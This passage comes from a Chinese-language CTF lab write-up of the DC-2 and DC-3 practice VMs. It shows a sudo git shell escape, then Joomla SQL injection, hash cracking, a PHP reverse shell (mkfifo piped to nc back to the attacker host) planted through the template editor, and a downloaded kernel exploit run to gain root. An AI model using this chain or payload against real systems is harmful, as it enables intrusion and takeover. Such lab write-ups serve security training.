VIMRUNTIME=<span class="string">"/usr/share/vim/vim74"</span></span><br></pre></td></tr></table></figure>
<p>此时就绕过了限制，可以查看flag3.txt的内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cat flag3.txt</span></span><br><span class="line"></span><br><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su <span class="keyword">for</span> all the stress he causes.</span><br></pre></td></tr></table></figure>
<p>提示如下</p>
<blockquote>
<p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p>
</blockquote>
<p>根据提示，我们此时切换到jerry用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># su jerry</span></span><br><span class="line"><span class="comment"># adipiscing</span></span><br><span class="line"><span class="comment"># cd /home/jerry/</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="comment"># cat flag4.txt</span></span><br><span class="line"></span><br><span class="line">tom@DC-2:~$ su jerry</span><br><span class="line">Password: </span><br><span class="line">jerry@DC-2:/home/tom$ <span class="built_in">cd</span> /home/jerry/</span><br><span class="line">jerry@DC-2:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">jerry@DC-2:~$ cat flag4.txt</span><br><span class="line">Good to see that you<span class="string">'ve made it this far - but you'</span>re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you<span class="string">'re on your own now.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br></pre></td></tr></table></figure>
<p>提示如下</p>
<blockquote>
<p>Good to see that you’ve made it this far - but you’re not home yet. </p>
<p>You still need to get the final flag (the only flag that really counts!!!).  </p>
<p>No hints here - you’re on your own now.  :-)</p>
<p>Go on - git outta here!!!!</p>
</blockquote>
<p>表面上说没有提示，但是最后一句话有<code>git</code>单词，提示我们利用git提权。提权成功后，拿到了最后的flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo git -p help config</span></span><br><span class="line"><span class="comment"># !/bin/sh</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment"># cd ~</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="comment"># cat final-flag.txt</span></span><br><span class="line"></span><br><span class="line">jerry@DC-2:~$ sudo git -p <span class="built_in">help</span> config</span><br><span class="line">GIT-CONFIG(1)  ...</span><br><span class="line">NAME</span><br><span class="line">       git-config - Get and <span class="built_in">set</span> repository or global options</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] name [value [value_regex]]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] --add name value</span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       You can query/<span class="built_in">set</span>/replace/<span class="built_in">unset</span> options with this <span class="built_in">command</span>. The name is actually the section and the key separated by a dot, and the</span><br><span class="line">       ...</span><br><span class="line">       expansion (see --path below). If no <span class="built_in">type</span> specifier is passed, no checks or transformations are performed on the value.</span><br><span class="line">!/bin/sh</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># cd ~</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">final-flag.txt</span><br><span class="line"><span class="comment"># cat final-flag.txt</span></span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">'_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it'</span>s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.43.84）</p>
<p>靶机：DC-3（IP：192.168.43.134）</p>
<h2 id="渗透测试-2"><a href="#渗透测试-2" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描靶机，发现只开启了80端口，浏览器访问</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-1.png" alt="3-1"></p>
<p>利用前段时间学长给的工具<code>gwhatweb</code>，知道了网站框架是<code>Joomla(逐浪)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># python gwhatweb.py http://192.168.43.134/</span><br><span class="line"></span><br><span class="line">root@Knlvre:~/桌面/gwhatweb-master# python gwhatweb.py http://192.168.43.134/</span><br><span class="line">webdata total:1421</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/administrator/components/com_login/login.xml re:joomla</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/components/com_wrapper/wrapper.xml re:joomla</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/README.txt re:joomla</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/plugins/authentication/joomla/joomla.xml re:joomla</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/modules/mod_banners/mod_banners.xml re:joomla</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/robots.txt.dist re:joomla</span><br><span class="line">cost: 4.991101 s</span><br></pre></td></tr></table></figure>
<p>使用Joomla框架扫描工具<code>Joomblah</code>扫描网站</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># python joomblah.py http://192.168.43.134/</span><br><span class="line"></span><br><span class="line">root@Knlvre:~/桌面/exploits/Joomblah# python joomblah.py http://192.168.43.134/</span><br><span class="line">                                                                                                                    </span><br><span class="line">    .---.    .-&apos;&apos;&apos;-.        .-&apos;&apos;&apos;-.                                                           </span><br><span class="line">    |   |   &apos;   _    \     &apos;   _    \                            .---.                        </span><br><span class="line">    &apos;---&apos; /   /` &apos;.   \  /   /` &apos;.   \  __  __   ___   /|        |   |            .           </span><br><span class="line">    .---..   |     \  &apos; .   |     \  &apos; |  |/  `.&apos;   `. ||        |   |          .&apos;|           </span><br><span class="line">    |   ||   &apos;      |  &apos;|   &apos;      |  &apos;|   .-.  .-.   &apos;||        |   |         &lt;  |           </span><br><span class="line">    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           </span><br><span class="line">    |   | `.   ` ..&apos; /   `.   ` ..&apos; /  |  |  |  |  |  |||/&apos;__ &apos;. |   | .:--.&apos;.  | | .&apos;&apos;&apos;-.    </span><br><span class="line">    |   |    &apos;-...-&apos;`       &apos;-...-&apos;`   |  |  |  |  |  ||:/`  &apos;. &apos;|   |/ |   \ | | |/.&apos;&apos;&apos;. \   </span><br><span class="line">    |   |                              |  |  |  |  |  |||     | ||   |`&quot; __ | | |  /    | |   </span><br><span class="line">    |   |                              |__|  |__|  |__|||\    / &apos;|   | .&apos;.&apos;&apos;| | | |     | |   </span><br><span class="line"> __.&apos;   &apos;                                              |/&apos;..&apos; / &apos;---&apos;/ /   | |_| |     | |   </span><br><span class="line">|      &apos;                                               &apos;  `&apos;-&apos;`       \ \._,\ &apos;/| &apos;.    | &apos;.  </span><br><span class="line">|____.&apos;                                                                `--&apos;  `&quot; &apos;---&apos;   &apos;---&apos; </span><br><span class="line"></span><br><span class="line"> [-] Fetching CSRF token</span><br><span class="line"> [-] Testing SQLi</span><br><span class="line">  -  Found table: d8uea_users</span><br><span class="line">  -  Found table: users</span><br><span class="line">  -  Extracting users from d8uea_users</span><br><span class="line"> [$] Found user [&apos;629&apos;, &apos;admin&apos;, &apos;admin&apos;, &apos;freddy@norealaddress.net&apos;, &apos;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&apos;, &apos;&apos;, &apos;&apos;]</span><br><span class="line">  -  Extracting sessions from d8uea_session</span><br><span class="line">  -  Extracting users from users</span><br><span class="line">  -  Extracting sessions from session</span><br></pre></td></tr></table></figure>
<p>得到一串<code>hash</code>密码， 用<code>john</code>工具爆破一下得到密码：snoopy</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># vi hash.txt</span><br><span class="line"># 填入$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br><span class="line"># john hash.txt</span><br><span class="line"></span><br><span class="line">root@Knlvre:~/桌面/Hash-Algorithm-Identifier/hashidentifier# vi hash.txt</span><br><span class="line">root@Knlvre:~/桌面/Hash-Algorithm-Identifier/hashidentifier# john hash.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 1024 for all loaded hashes</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">snoopy           (?)</span><br><span class="line">1g 0:00:00:02 DONE 2/3 (2019-09-23 09:06) 0.4830g/s 17.39p/s 17.39c/s 17.39C/s mustang..buster</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>Ps：第一次使用<code>john</code>，当重复爆破一个文件时，会出现以下提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# john hash.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">No password hashes left to crack (see FAQ)	#提示</span><br></pre></td></tr></table></figure>
<p>百度之后才知道，john不会再执行爆破过的文件，如果出现如上提示，可以加<code>--show</code>参数查看文件，就能看到破解情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# john --show hash.txt </span><br><span class="line">?:snoopy</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>
<p><code>dirsearch</code>扫描出后台<code>/administrator/</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[09:57:08] 200 -    5KB - /administrator/</span><br><span class="line">[09:57:08] 200 -    5KB - /administrator/index.php</span><br><span class="line">[09:57:08] 301 -  329B  - /administrator/logs  -&gt;  http://192.168.43.134/administrator/logs/</span><br><span class="line">[09:57:11] 301 -  314B  - /bin  -&gt;  http://192.168.43.134/bin/</span><br><span class="line">[09:57:11] 200 -   31B  - /bin/</span><br><span class="line">[09:57:11] 301 -  316B  - /cache  -&gt;  http://192.168.43.134/cache/</span><br><span class="line">[09:57:11] 200 -   31B  - /cache/</span><br><span class="line">[09:57:12] 301 -  321B  - /components  -&gt;  http://192.168.43.134/components/</span><br><span class="line">[09:57:13] 200 -    0B  - /configuration.php</span><br><span class="line">[09:57:17] 200 -    3KB - /htaccess.txt</span><br><span class="line">[09:57:18] 301 -  317B  - /images  -&gt;  http://192.168.43.134/images/</span><br><span class="line">[09:57:18] 301 -  319B  - /includes  -&gt;  http://192.168.43.134/includes/</span><br><span class="line">[09:57:18] 200 -   31B  - /includes/</span><br><span class="line">[09:57:18] 200 -    7KB - /index.php</span><br><span class="line">[09:57:20] 301 -  319B  - /language  -&gt;  http://192.168.43.134/language/</span><br><span class="line">[09:57:20] 301 -  320B  - /libraries  -&gt;  http://192.168.43.134/libraries/</span><br><span class="line">[09:57:20] 200 -   18KB - /LICENSE.txt</span><br><span class="line">[09:57:21] 301 -  316B  - /media  -&gt;  http://192.168.43.134/media/</span><br><span class="line">[09:57:22] 301 -  318B  - /modules  -&gt;  http://192.168.43.134/modules/</span><br><span class="line">[09:57:25] 301 -  318B  - /plugins  -&gt;  http://192.168.43.134/plugins/</span><br><span class="line">[09:57:26] 200 -    4KB - /README.txt</span><br><span class="line">[09:57:27] 403 -  302B  - /server-status</span><br><span class="line">[09:57:27] 403 -  303B  - /server-status/</span><br><span class="line">[09:57:31] 200 -   31B  - /templates/</span><br><span class="line">[09:57:31] 301 -  320B  - /templates  -&gt;  http://192.168.43.134/templates/</span><br><span class="line">[09:57:32] 301 -  314B  - /tmp  -&gt;  http://192.168.43.134/tmp/</span><br><span class="line">[09:57:32] 200 -   31B  - /tmp/</span><br><span class="line">[09:57:33] 200 -    2KB - /web.config.txt</span><br></pre></td></tr></table></figure>
<p>访问后，用admin的密码成功登陆</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-2.png" alt="3-2"></p>
<p>选择<code>Configuration -&gt; Templates -&gt; Templates -&gt; Protostar Details and Files -&gt; New File</code>，创建<code>shell.php</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-3.png" alt="3-3"></p>
<p>插入反弹shell命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.43.84 3737 &gt;/tmp/f'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-4.png" alt="3-4"></p>
<p>写完保存之后，我们先用<code>nc</code>监听<code>3737</code>端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br></pre></td></tr></table></figure>
<p>然后访问<code>shell.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.134/templates/protostar/shell.php</span><br></pre></td></tr></table></figure>
<p>在查看终端时，就拿到了shell，但是该用户并没有什么权限，无法切换到<code>~</code>目录下，准备提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br><span class="line">connect to [192.168.43.84] from DC3VM [192.168.43.134] 44292</span><br><span class="line">/bin/sh: 0: can&apos;t access tty; job control turned off</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
<p>查看版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:	Ubuntu</span><br><span class="line">Description:	Ubuntu 16.04 LTS</span><br><span class="line">Release:	16.04</span><br><span class="line">Codename:	xenial</span><br></pre></td></tr></table></figure>
<p>使用<code>searchsploit</code>查看关键字<code>Ubuntu和16.04</code>的漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-5.png" alt="3-5"></p>
<p>使用<code>exploits/linux/local/39772.txt</code>，通过<code>-m</code>参数复制到当前目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# searchsploit -m exploits/linux/local/39772.txt</span><br><span class="line">  Exploit: Linux Kernel 4.4.x (Ubuntu 16.04) - &apos;double-fdput()&apos; bpf(BPF_PROG_LOAD) Privilege Escalation</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/39772</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br><span class="line">File Type: C source, ASCII text, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/39772.txt</span><br></pre></td></tr></table></figure>
<p>查看<code>39772.txt</code>可以看到介绍用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# tail -20 39772.txt </span><br><span class="line"></span><br><span class="line">An exploit that puts all this together is in exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&apos;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">root@host:~/ebpf_mapfd_doubleput# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span><br><span class="line"></span><br><span class="line">This exploit was tested on a Ubuntu 16.04 Desktop system.</span><br><span class="line"></span><br><span class="line">Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552</span><br><span class="line">Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>
<p>注意到上面的这个<code>Exploit-DB Mirror</code>，下载这个<code>zip</code>文件到靶机上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">$ pwd</span><br><span class="line">/var/www/html/templates/protostar</span><br><span class="line">$ ls</span><br><span class="line">component.php</span><br><span class="line">css</span><br><span class="line">...</span><br><span class="line">$ mkdir 39772</span><br><span class="line">$ cd 39772</span><br><span class="line">$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">--2019-09-23 16:01:08--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">...</span><br><span class="line">2019-09-23 16:01:10 (4.38 MB/s) - &apos;39772.zip&apos; saved [7025/7025]</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">39772.zip</span><br><span class="line">$ unzip 39772.zip</span><br><span class="line">Archive:  39772.zip</span><br><span class="line">   creating: 39772/</span><br><span class="line">  inflating: 39772/.DS_Store         </span><br><span class="line">   creating: __MACOSX/</span><br><span class="line">   creating: __MACOSX/39772/</span><br><span class="line">  inflating: __MACOSX/39772/._.DS_Store  </span><br><span class="line">  inflating: 39772/crasher.tar       </span><br><span class="line">  inflating: __MACOSX/39772/._crasher.tar  </span><br><span class="line">  inflating: 39772/exploit.tar       </span><br><span class="line">  inflating: __MACOSX/39772/._exploit.tar  </span><br><span class="line">$ ls</span><br><span class="line">39772</span><br><span class="line">39772.zip</span><br><span class="line">__MACOSX</span><br><span class="line">$ cd 39772</span><br><span class="line">$ ls</span><br><span class="line">crasher.tar</span><br><span class="line">exploit.tar</span><br><span class="line">$ tar -xvf exploit.tar</span><br><span class="line">ebpf_mapfd_doubleput_exploit/</span><br><span class="line">ebpf_mapfd_doubleput_exploit/hello.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/suidhelper.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/compile.sh</span><br><span class="line">ebpf_mapfd_doubleput_exploit/doubleput.c</span><br><span class="line">$ ls</span><br><span class="line">crasher.tar</span><br><span class="line">ebpf_mapfd_doubleput_exploit</span><br><span class="line">exploit.tar</span><br><span class="line">$ cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">$ ls</span><br><span class="line">compile.sh</span><br><span class="line">doubleput.c</span><br><span class="line">hello.c</span><br><span class="line">suidhelper.c</span><br><span class="line">$ ./compile.sh</span><br><span class="line">doubleput.c: In function &apos;make_setuid&apos;:</span><br><span class="line">doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .insns = (__aligned_u64) insns,</span><br><span class="line">             ^</span><br><span class="line">doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .license = (__aligned_u64)&quot;&quot;</span><br><span class="line">               ^</span><br><span class="line">$ ls</span><br><span class="line">compile.sh</span><br><span class="line">doubleput</span><br><span class="line">doubleput.c</span><br><span class="line">hello</span><br><span class="line">hello.c</span><br><span class="line">suidhelper</span><br><span class="line">suidhelper.c</span><br><span class="line">$ ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&apos;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
<p>执行<code>compile.sh</code>的过程中好像报错了，但是不要紧，还是生成了<code>doubleput</code>，执行后拿到了<code>root</code>权限，拿到了flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls</span><br><span class="line">the-flag.txt</span><br><span class="line">cat the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| &apos;_ \ / _ \ | | | |</span><br><span class="line">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span><br><span class="line">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span><br><span class="line">                                                     </span><br><span class="line"></span><br><span class="line">Congratulations are in order for completing DC-3VM.  :-)</span><br><span class="line"></span><br><span class="line">I hope you&apos;ve enjoyed this challenge as much as I enjoyed making it.</span><br><span class="line"></span><br><span class="line">If there are any ways that I can improve these little challenges,</span><br><span class="line">please let me 